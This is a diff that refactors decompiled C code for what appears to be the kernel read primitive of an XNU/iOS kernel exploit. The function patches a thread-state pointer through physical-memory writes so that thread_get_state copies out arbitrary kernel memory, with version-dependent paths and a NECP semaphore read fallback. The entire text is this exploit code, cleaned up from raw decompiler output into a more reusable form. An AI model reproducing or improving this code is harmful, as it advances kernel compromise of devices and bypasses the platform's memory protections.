@@ -578,233 +578,163 @@ __int64 __fastcall kreadbuf_via_dev_null_and_thread_state(
         unsigned int size,
         int a5)
 {
-  __int64 v5; // x28
-  unsigned __int64 vaddr_; // x22
-  unsigned int iMaybe; // w8
-  unsigned __int32 sizeMinusI; // w19
-  __int64 iPtr; // x26
-  unsigned __int64 xnuVersionPacked; // x8
-  int v16; // w9
-  unsigned __int32 v17; // w8
-  unsigned __int32 v18[2]; // x24
-  unsigned __int64 v19; // x20
-  __int64 v20; // x8
-  size_t offIGuess; // x26
-  unsigned __int64 v22; // x21
-  void *outBufWithOffAndOff; // x27
-  unsigned __int64 v24; // x22
-  uint64_t v25; // x8
-  __int64 v26; // x9
-  unsigned __int64 v27; // x8
-  unsigned __int64 v28; // x19
-  __int64 v29; // x25
-  kern_return_t v30; // w0
-  uint64_t pageMask; // x25
-  __int64 v32; // x19
-  __int64 v33; // x25
-  __int64 v34; // x0
-  kern_return_t state; // w0
-  unsigned int v36; // w19
-  __int64 v37; // x0
-  unsigned int v38; // w0
-  unsigned int v39; // w8
-  unsigned __int64 vaddr__; // [xsp+8h] [xbp-2B8h]
-  __int64 outBuf_; // [xsp+10h] [xbp-2B0h]
-  unsigned int size_; // [xsp+1Ch] [xbp-2A4h]
-  int v43; // [xsp+20h] [xbp-2A0h]
-  __int64 outBufWithOff; // [xsp+28h] [xbp-298h]
-  __int64 vaddrPlusI; // [xsp+30h] [xbp-290h]
-  int fd; // [xsp+38h] [xbp-288h] BYREF
-  mach_msg_type_number_t v47; // [xsp+3Ch] [xbp-284h] BYREF
-  natural_t old_state[134]; // [xsp+40h] [xbp-280h] BYREF
-  __int64 v49; // [xsp+258h] [xbp-68h] BYREF
-  mach_msg_type_number_t old_stateCnt[4]; // [xsp+260h] [xbp-60h] BYREF
+  natural_t threadState[134];
+  int fd = -1;
+  __int64 status = 0xAD001;
 
-  v5 = 0xAD001;
-  if ( krwCtx->threadForKernelRead + 1 >= 2 )
+  if ( krwCtx->threadForKernelRead + 1 < 2 || !krwCtx->threadStateKrwPhysAddr )
+    return status;
+  if ( !check_kaddr_in_physmap(krwCtx, vaddr) )
+    return status;
+
+  if ( a5 )
   {
-    if ( *(uint64_t *)&krwCtx->threadStateKrwPhysAddr )
+    status = fd_open_dev_null(&fd);
+    if ( (uint32_t)status )
+      return status;
+  }
+
+  uint32_t offset = 0;
+  while ( offset < size )
+  {
+    uint32_t remaining = size - offset;
+    uint64_t currentVaddr = vaddr + offset;
+    uint32_t chunkSize;
+
+    if ( (krwCtx->pageMask & currentVaddr) == 0 && remaining >= 0x4000 && krw_ctx_has_read_caps(krwCtx) )
     {
-      vaddr_ = vaddr;
-      if ( check_kaddr_in_physmap(krwCtx, vaddr) )
+      uint64_t xnuVersionPacked = krwCtx->xnuVersionPacked;
+      uint32_t maxChunk = xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) ? 0x4000 : 0x80000;
+      if ( xnuVersionPacked > XNU_VERSION_PACKED(10001, 1023, 1023, 1023, 1023) )
+        maxChunk = 528;
+
+      chunkSize = remaining >= maxChunk ? maxChunk : remaining;
+      status = necp_semaphore_kread(krwCtx, currentVaddr, (char *)(outBuf + offset), chunkSize);
+      if ( (uint32_t)status )
+        break;
+      offset += chunkSize;
+      continue;
+    }
+
+    chunkSize = remaining >= 528 ? 528 : remaining;
+    if ( krwCtx->threadForKernelRead + 1 < 2 || !krwCtx->threadStateKrwPhysAddr )
+    {
+      status = 708609;
+      break;
+    }
+
+    uint32_t chunkOffset = 0;
+    while ( chunkOffset < chunkSize )
+    {
+      uint64_t readVaddr = currentVaddr + chunkOffset;
+      uint32_t bytesLeftInChunk = chunkSize - chunkOffset;
+      size_t bytesCopied = 0;
+
+      if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(10002, 60, 75, 0, 3)
+        && (krwCtx->flags & KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) != 0 )
       {
-        fd = -1;
-        if ( !a5 || (v5 = fd_open_dev_null(&fd), !(uint32_t)v5) )
+        uint64_t pageMask = krwCtx->pageMask;
+        uint64_t pageWindowOffset = pageMask & readVaddr;
+        uint64_t maxWindowOffset = (uint32_t)krwCtx->pageSizeOrSomething - 528LL;
+        uint64_t savedThreadStatePtr = 0;
+        mach_msg_type_number_t stateCount = 132;
+
+        if ( pageWindowOffset >= maxWindowOffset )
+          pageWindowOffset = maxWindowOffset;
+
+        if ( validate_kaddr_range(krwCtx, krwCtx->threadStateSavedPtr) )
         {
-          if ( size )
+          savedThreadStatePtr = krwCtx->threadStateSavedPtr;
+        }
+        else
+        {
+          status = read_via_mapped_physmem_region(krwCtx, krwCtx->threadStateKrwPhysAddr, &savedThreadStatePtr, 8u, 0);
+          if ( (uint32_t)status )
+            break;
+          krwCtx->threadStateSavedPtr = savedThreadStatePtr;
+        }
+
+        uint64_t threadStateWindow = (readVaddr & ~pageMask) + pageWindowOffset;
+        uint64_t patchedThreadStatePtr = threadStateWindow - 16;
+        __dsb(0xBu);
+
+        status = physwritebuf_direct_mapped(krwCtx, krwCtx->threadStateKrwPhysAddr, &patchedThreadStatePtr, 8u, 0);
+        if ( !(uint32_t)status )
+        {
+          uint32_t readStatus = 0;
+          kern_return_t kr = thread_get_state(krwCtx->threadForKernelRead, 0x11, threadState, &stateCount);
+          if ( kr )
           {
-            iMaybe = 0;
-            size_ = size;
-            vaddr__ = vaddr_;
-            outBuf_ = outBuf;
-            while ( 1 )
-            {
-              sizeMinusI = size - iMaybe;
-              iPtr = iMaybe;
-              vaddrPlusI = vaddr_ + iMaybe;
-              if ( (krwCtx->pageMask & vaddrPlusI) == 0 && sizeMinusI >= 0x4000 && krw_ctx_has_read_caps(krwCtx) )
-              {
-                xnuVersionPacked = krwCtx->xnuVersionPacked;
-                if ( xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
-                  v16 = 0x4000;
-                else
-                  v16 = 0x80000;
-                if ( xnuVersionPacked <= XNU_VERSION_PACKED(10001, 1023, 1023, 1023, 1023) )
-                  v17 = v16;
-                else
-                  v17 = 528;
-                if ( sizeMinusI >= v17 )
-                  v18[0] = v17;
-                else
-                  v18[0] = sizeMinusI;
-                v5 = necp_semaphore_kread(krwCtx, vaddrPlusI, (char *)(outBuf + iPtr), v18[0]);
-LABEL_68:
-                if ( (uint32_t)v5 )
-                  goto LABEL_72;
-                goto LABEL_69;
-              }
-              if ( sizeMinusI >= 0x210 )
-                *(uint64_t *)v18 = 528;
-              else
-                *(uint64_t *)v18 = sizeMinusI;
-              if ( krwCtx->threadForKernelRead + 1 < 2 || !*(uint64_t *)&krwCtx->threadStateKrwPhysAddr )
-              {
-                v5 = 708609;
-                goto LABEL_72;
-              }
-              if ( v18[0] )
-                break;
-LABEL_69:
-              iMaybe = v18[0] + iPtr;
-              if ( v18[0] + (unsigned int)iPtr >= size )
-                goto LABEL_70;
-            }
-            v19 = 0;
-            v20 = iPtr;
-            offIGuess = 0;
-            v43 = v20;
-            outBufWithOff = outBuf + v20;
-            while ( 1 )
-            {
-              v22 = v19 + vaddrPlusI;
-              outBufWithOffAndOff = (void *)(v19 + outBufWithOff);
-              v24 = *(uint64_t *)v18 - v19;
-              if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(10002, 60, 75, 0, 3) && (krwCtx->flags & KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) != 0 )
-              {
-                *(uint64_t *)old_stateCnt = 0;
-                v47 = 132;
-                pageMask = krwCtx->pageMask;
-                if ( (pageMask & v22) >= (unsigned __int64)(unsigned int)krwCtx->pageSizeOrSomething - 528 )
-                  v32 = (unsigned int)krwCtx->pageSizeOrSomething - 528LL;
-                else
-                  v32 = pageMask & v22;
-                if ( validate_kaddr_range(krwCtx, *(uint64_t *)&krwCtx->threadStateSavedPtr) )
-                {
-                  *(uint64_t *)old_stateCnt = *(uint64_t *)&krwCtx->threadStateSavedPtr;
-                  goto LABEL_45;
-                }
-                v37 = read_via_mapped_physmem_region(krwCtx, *(uint64_t *)&krwCtx->threadStateKrwPhysAddr, old_stateCnt, 8u, 0);
-                v5 = v37;
-                if ( !(uint32_t)v37 )
-                {
-                  *(uint64_t *)&krwCtx->threadStateSavedPtr = *(uint64_t *)old_stateCnt;
-LABEL_45:
-                  v33 = v32 + (v22 & ~pageMask);
-                  __dsb(0xBu);
-                  v49 = v33 - 16;
-                  v34 = physwritebuf_direct_mapped(krwCtx, *(uint64_t *)&krwCtx->threadStateKrwPhysAddr, &v49, 8u, 0);
-                  v5 = v34;
-                  if ( !(uint32_t)v34 )
-                  {
-                    state = thread_get_state(krwCtx->threadForKernelRead, 0x11, old_state, &v47);
-                    if ( state )
-                    {
-                      v36 = state | 0x80000000;
-                    }
-                    else if ( v47 == 132 )
-                    {
-                      if ( v33 - v22 + 528 <= v24 )
-                        offIGuess = v33 - v22 + 528;
-                      else
-                        offIGuess = *(uint64_t *)v18 - v19;
-                      memcpy(outBufWithOffAndOff, (char *)old_state + v22 - v33, offIGuess);
-                      v36 = 0;
-                    }
-                    else
-                    {
-                      v36 = 708642;
-                    }
-                    v38 = physwritebuf_direct_mapped(krwCtx, *(uint64_t *)&krwCtx->threadStateKrwPhysAddr, old_stateCnt, 8u, 0);
-                    if ( v36 )
-                      v39 = v36;
-                    else
-                      v39 = v38;
-                    if ( v38 )
-                      v5 = v39;
-                    else
-                      v5 = v36;
-                  }
-                }
-              }
-              else
-              {
-                old_stateCnt[0] = 132;
-                v25 = krwCtx->pageMask;
-                v26 = v22 & ~v25;
-                v27 = v25 & v22;
-                if ( v27 >= (unsigned __int64)(unsigned int)krwCtx->pageSizeOrSomething - 528 )
-                  v27 = (unsigned int)krwCtx->pageSizeOrSomething - 528LL;
-                v28 = v27 + v26;
-                v29 = **(uint64_t **)&krwCtx->threadStateMappedPtr;
-                __dsb(0xBu);
-                **(uint64_t **)&krwCtx->threadStateMappedPtr = v27 + v26 - 16;
-                v30 = thread_get_state(krwCtx->threadForKernelRead, 17, old_state, old_stateCnt);
-                if ( v30 )
-                {
-                  v5 = v30 | 0x80000000;
-                }
-                else if ( old_stateCnt[0] == 132 )
-                {
-                  if ( v28 - v22 + 528 <= v24 )
-                    offIGuess = v28 - v22 + 528;
-                  else
-                    offIGuess = *(uint64_t *)v18 - v19;
-                  memcpy(outBufWithOffAndOff, (char *)old_state + v22 - v28, offIGuess);
-                  v5 = 0;
-                }
-                else
-                {
-                  v5 = 708642;
-                }
-                **(uint64_t **)&krwCtx->threadStateMappedPtr = v29;
-              }
-              if ( !(uint32_t)v5 )
-              {
-                v19 += offIGuess;
-                if ( v19 < *(uint64_t *)v18 )
-                  continue;
-              }
-              size = size_;
-              vaddr_ = vaddr__;
-              outBuf = outBuf_;
-              LODWORD(iPtr) = v43;
-              goto LABEL_68;
-            }
+            readStatus = kr | 0x80000000;
           }
-LABEL_70:
-          v5 = 0;
-LABEL_72:
-          if ( fd != -1 )
-            fd_close(fd);
+          else if ( stateCount == 132 )
+          {
+            uint64_t windowBytesLeft = threadStateWindow - readVaddr + 528;
+            bytesCopied = windowBytesLeft <= bytesLeftInChunk ? windowBytesLeft : bytesLeftInChunk;
+            memcpy((void *)(outBuf + offset + chunkOffset), (char *)threadState + readVaddr - threadStateWindow, bytesCopied);
+          }
+          else
+          {
+            readStatus = 708642;
+          }
+
+          uint32_t restoreStatus = physwritebuf_direct_mapped(krwCtx, krwCtx->threadStateKrwPhysAddr, &savedThreadStatePtr, 8u, 0);
+          status = restoreStatus ? (readStatus ? readStatus : restoreStatus) : readStatus;
         }
       }
+      else
+      {
+        mach_msg_type_number_t stateCount = 132;
+        uint64_t pageMask = krwCtx->pageMask;
+        uint64_t pageBase = readVaddr & ~pageMask;
+        uint64_t pageWindowOffset = pageMask & readVaddr;
+        uint64_t maxWindowOffset = (uint32_t)krwCtx->pageSizeOrSomething - 528LL;
+
+        if ( pageWindowOffset >= maxWindowOffset )
+          pageWindowOffset = maxWindowOffset;
+
+        uint64_t threadStateWindow = pageBase + pageWindowOffset;
+        uint64_t *mappedThreadStatePtr = (uint64_t *)krwCtx->threadStateMappedPtr;
+        uint64_t savedThreadStatePtr = *mappedThreadStatePtr;
+        __dsb(0xBu);
+        *mappedThreadStatePtr = threadStateWindow - 16;
+
+        kern_return_t kr = thread_get_state(krwCtx->threadForKernelRead, 17, threadState, &stateCount);
+        if ( kr )
+        {
+          status = kr | 0x80000000;
+        }
+        else if ( stateCount == 132 )
+        {
+          uint64_t windowBytesLeft = threadStateWindow - readVaddr + 528;
+          bytesCopied = windowBytesLeft <= bytesLeftInChunk ? windowBytesLeft : bytesLeftInChunk;
+          memcpy((void *)(outBuf + offset + chunkOffset), (char *)threadState + readVaddr - threadStateWindow, bytesCopied);
+          status = 0;
+        }
+        else
+        {
+          status = 708642;
+        }
+
+        *mappedThreadStatePtr = savedThreadStatePtr;
+      }
+
+      if ( (uint32_t)status )
+        break;
+      chunkOffset += bytesCopied;
     }
+
+    if ( (uint32_t)status )
+      break;
+    offset += chunkSize;
   }
-  return v5;
+
+  if ( offset >= size )
+    status = 0;
+  if ( fd != -1 )
+    fd_close(fd);
+  return status;
 }
-// 2999C: variable 'v34' is possibly undefined
-// 29A04: variable 'v37' is possibly undefined
-// 29A7C: variable 'v38' is possibly undefined
 
 //----- (0000000000029AD0) ----------------------------------------------------
 __int64 __fastcall kreadbuf_via_tfp0(
